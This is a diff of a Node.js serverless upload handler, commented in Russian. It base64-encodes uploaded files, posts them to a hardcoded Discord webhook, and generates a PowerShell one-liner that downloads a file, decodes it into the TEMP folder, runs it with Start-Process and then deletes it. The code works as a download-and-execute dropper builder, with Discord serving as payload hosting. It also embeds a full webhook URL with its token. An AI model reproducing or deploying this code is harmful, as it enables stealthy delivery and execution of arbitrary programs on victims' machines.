@@ -2,124 +2,127 @@ const https = require('https');
 
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';
 
+// Вспомогательная функция для парсинга multipart
 function parseMultipart(data, boundary) {
     const parts = [];
     const boundaryBuffer = Buffer.from('--' + boundary);
-    const endBoundaryBuffer = Buffer.from('--' + boundary + '--');
-    let start = 0;
+    let start = data.indexOf(boundaryBuffer);
     
-    while (true) {
-        const boundaryIndex = data.indexOf(boundaryBuffer, start);
-        if (boundaryIndex === -1) break;
+    while (start !== -1) {
+        let end = data.indexOf(boundaryBuffer, start + boundaryBuffer.length);
+        if (end === -1) break;
         
-        const isEndBoundary = data.indexOf(endBoundaryBuffer, start) === boundaryIndex;
-        const nextBoundaryIndex = data.indexOf(boundaryBuffer, boundaryIndex + boundaryBuffer.length);
+        const part = data.slice(start + boundaryBuffer.length, end);
+        const headerEnd = part.indexOf('\r\n\r\n');
         
-        if (nextBoundaryIndex === -1 && !isEndBoundary) break;
-        
-        const endIndex = nextBoundaryIndex !== -1 ? nextBoundaryIndex : boundaryIndex + (isEndBoundary ? endBoundaryBuffer.length : boundaryBuffer.length);
-        const part = data.slice(boundaryIndex + boundaryBuffer.length, endIndex);
-        
-        let contentStart = 0;
-        if (part.slice(0, 2).toString() === '\r\n') contentStart = 2;
-        
-        const headerEnd = part.indexOf('\r\n\r\n', contentStart);
         if (headerEnd !== -1) {
-            const headers = part.slice(contentStart, headerEnd).toString();
+            const headers = part.slice(0, headerEnd).toString();
             let content = part.slice(headerEnd + 4);
-            if (content.slice(-2).toString() === '\r\n') content = content.slice(0, -2);
+            if (content.slice(-2).toString() === '\r\n') {
+                content = content.slice(0, -2);
+            }
             
             const nameMatch = headers.match(/name="([^"]+)"/);
             const filenameMatch = headers.match(/filename="([^"]+)"/);
             
             if (nameMatch) {
-                parts.push({ name: nameMatch[1], filename: filenameMatch ? filenameMatch[1] : null, content });
+                parts.push({
+                    name: nameMatch[1],
+                    filename: filenameMatch ? filenameMatch[1] : null,
+                    content: content
+                });
             }
         }
-        
-        if (isEndBoundary || nextBoundaryIndex === -1) break;
-        start = nextBoundaryIndex;
+        start = end;
+        if (data.slice(start + boundaryBuffer.length, start + boundaryBuffer.length + 2).toString() === '--') {
+            break;
+        }
     }
     return parts;
 }
 
 function sendDiscordMessage(content) {
     return new Promise((resolve, reject) => {
-        const webhookUrl = new URL(DISCORD_WEBHOOK);
-        const data = JSON.stringify({ content });
-        
-        const discordReq = https.request({
-            hostname: webhookUrl.hostname,
-            path: webhookUrl.pathname,
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
-        }, discordRes => {
-            let responseData = '';
-            discordRes.on('data', chunk => responseData += chunk);
-            discordRes.on('end', () => resolve(responseData));
-        });
-        
-        discordReq.on('error', err => reject(err));
-        discordReq.write(data);
-        discordReq.end();
+        try {
+            const webhookUrl = new URL(DISCORD_WEBHOOK);
+            const data = JSON.stringify({ content });
+            
+            const req = https.request({
+                hostname: webhookUrl.hostname,
+                path: webhookUrl.pathname,
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
+            }, res => {
+                let body = '';
+                res.on('data', chunk => body += chunk);
+                res.on('end', () => resolve(body));
+            });
+            
+            req.on('error', reject);
+            req.write(data);
+            req.end();
+        } catch (e) {
+            reject(e);
+        }
     });
 }
 
 function uploadFileToDiscord(filePart) {
     return new Promise((resolve, reject) => {
-        const base64Content = filePart.content.toString('base64');
-        const encodedFilename = filePart.filename.replace(/\.[^/.]+$/, '') + '.b64';
-        const boundary = '----DiscordBoundary' + Date.now();
-        
-        const discordData = [
-            `--${boundary}\r\n`,
-            `Content-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\n`,
-            `Content-Type: text/plain\r\n\r\n`,
-        ];
-        
-        const body = Buffer.concat([
-            Buffer.from(discordData.join('')),
-            Buffer.from(base64Content),
-            Buffer.from(`\r\n--${boundary}--\r\n`)
-        ]);
-        
-        const webhookUrl = new URL(DISCORD_WEBHOOK);
-        const discordReq = https.request({
-            hostname: webhookUrl.hostname,
-            path: webhookUrl.pathname,
-            method: 'POST',
-            headers: {
-                'Content-Type': `multipart/form-data; boundary=${boundary}`,
-                'Content-Length': body.length
-            }
-        }, discordRes => {
-            let data = '';
-            discordRes.on('data', chunk => data += chunk);
-            discordRes.on('end', () => {
-                try {
-                    const json = JSON.parse(data);
-                    if (json.attachments?.[0]?.url) {
-                        resolve({
-                            fileUrl: json.attachments[0].url,
-                            originalName: filePart.filename
-                        });
-                    } else {
-                        reject(new Error('No attachment in Discord response'));
-                    }
-                } catch (e) {
-                    reject(e);
+        try {
+            const base64Content = filePart.content.toString('base64');
+            const encodedFilename = (filePart.filename || 'file').replace(/\.[^/.]+$/, '') + '.b64';
+            const boundary = '----DiscordBoundary' + Math.random().toString(36).substring(2);
+            
+            const header = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`;
+            const footer = `\r\n--${boundary}--\r\n`;
+            
+            const body = Buffer.concat([
+                Buffer.from(header),
+                Buffer.from(base64Content),
+                Buffer.from(footer)
+            ]);
+            
+            const webhookUrl = new URL(DISCORD_WEBHOOK);
+            const req = https.request({
+                hostname: webhookUrl.hostname,
+                path: webhookUrl.pathname,
+                method: 'POST',
+                headers: {
+                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
+                    'Content-Length': body.length
                 }
+            }, res => {
+                let responseData = '';
+                res.on('data', chunk => responseData += chunk);
+                res.on('end', () => {
+                    try {
+                        const json = JSON.parse(responseData);
+                        if (json.attachments && json.attachments[0]) {
+                            resolve({
+                                fileUrl: json.attachments[0].url,
+                                originalName: filePart.filename
+                            });
+                        } else {
+                            reject(new Error('Discord upload failed: ' + responseData));
+                        }
+                    } catch (e) {
+                        reject(new Error('Invalid Discord response: ' + responseData));
+                    }
+                });
             });
-        });
-        
-        discordReq.on('error', reject);
-        discordReq.write(body);
-        discordReq.end();
+            
+            req.on('error', reject);
+            req.write(body);
+            req.end();
+        } catch (e) {
+            reject(e);
+        }
     });
 }
 
 module.exports = async (req, res) => {
-    // Enable CORS
+    // Настройка CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -129,91 +132,66 @@ module.exports = async (req, res) => {
     }
 
     if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
+        return res.status(405).json({ success: false, error: 'Method not allowed' });
     }
 
     try {
-        console.log('Upload started...');
         const contentType = req.headers['content-type'] || '';
-        console.log('Content-Type:', contentType);
-
-        if (!contentType.includes('multipart/form-data')) {
-            return res.status(400).json({ success: false, error: 'Invalid content type: ' + contentType });
+        const boundaryMatch = contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/);
+        
+        if (!boundaryMatch) {
+            return res.status(400).json({ success: false, error: 'No boundary in Content-Type' });
         }
+        
+        const boundary = boundaryMatch[1] || boundaryMatch[2];
 
-        let boundary = contentType.split('boundary=')[1];
-        if (boundary) {
-            boundary = boundary.split(';')[0].replace(/^["']|["']$/g, '').trim();
-        } else {
-            return res.status(400).json({ success: false, error: 'No boundary found' });
-        }
-
-        console.log('Boundary:', boundary);
-
-        // Collect body data
+        // Чтение тела запроса
         const chunks = [];
-        try {
-            for await (const chunk of req) {
-                chunks.push(chunk);
+        let totalLength = 0;
+        
+        for await (const chunk of req) {
+            totalLength += chunk.length;
+            if (totalLength > 5 * 1024 * 1024) { // 5MB limit
+                return res.status(413).json({ success: false, error: 'File too large (max 5MB)' });
             }
-        } catch (e) {
-            console.error('Error reading request body:', e);
-            return res.status(500).json({ success: false, error: 'Failed to read request body: ' + e.message });
+            chunks.push(chunk);
         }
         
         const buffer = Buffer.concat(chunks);
-        console.log('Total buffer size:', buffer.length);
-
-        if (buffer.length === 0) {
-            return res.status(400).json({ success: false, error: 'Empty body' });
-        }
-
         const parts = parseMultipart(buffer, boundary);
-        console.log('Parsed parts count:', parts.length);
-        
         const fileParts = parts.filter(p => p.name === 'fileToUpload' && p.filename);
-        console.log('File parts found:', fileParts.length);
 
         if (fileParts.length === 0) {
-            return res.status(400).json({ success: false, error: 'No files found in parts. Parts keys: ' + parts.map(p => p.name).join(', ') });
+            return res.status(400).json({ success: false, error: 'No files provided' });
         }
 
-        // Upload all files
+        // Загрузка файлов
         const uploadResults = [];
         for (const filePart of fileParts) {
-            console.log('Uploading file to Discord:', filePart.filename);
             const result = await uploadFileToDiscord(filePart);
             uploadResults.push(result);
         }
 
-        // Generate combined command
+        // Генерация команды
         let combinedCmd = '';
         if (uploadResults.length === 1) {
             const r = uploadResults[0];
             combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
         } else {
-            let cmdParts = [];
-            let varDefs = [];
-            let startParts = [];
-            
+            let varDefs = [], cmdParts = [], startParts = [], tVars = [];
             uploadResults.forEach((r, i) => {
                 const idx = i + 1;
-                varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`);
-                varDefs.push(`$u${idx}='${r.fileUrl}'`);
+                varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`, `$u${idx}='${r.fileUrl}'`);
                 cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
                 startParts.push(`Start-Process $t${idx} -Wait`);
+                tVars.push(`$t${idx}`);
             });
-            
-            const removeParts = uploadResults.map((_, i) => `$t${i+1}`).join(',');
-            combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${removeParts}"`;
+            combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
         }
 
+        // Отправка в Discord
         const fileNames = uploadResults.map(r => r.originalName).join(', ');
-        const finalMsg = `📁 **${fileNames}**\n\nКоманда для скачивания и запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``;
-        
-        console.log('Sending message to Discord...');
-        await sendDiscordMessage(finalMsg);
-        console.log('Upload successful!');
+        await sendDiscordMessage(`📁 **${fileNames}**\n\nКоманда для запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``);
 
         return res.status(200).json({
             success: true,
@@ -222,7 +200,10 @@ module.exports = async (req, res) => {
         });
 
     } catch (error) {
-        console.error('Fatal API Error:', error);
-        return res.status(500).json({ success: false, error: 'Server Internal Error: ' + error.message });
+        console.error('API Error:', error);
+        return res.status(500).json({ 
+            success: false, 
+            error: 'Server Error: ' + error.message 
+        });
     }
 };
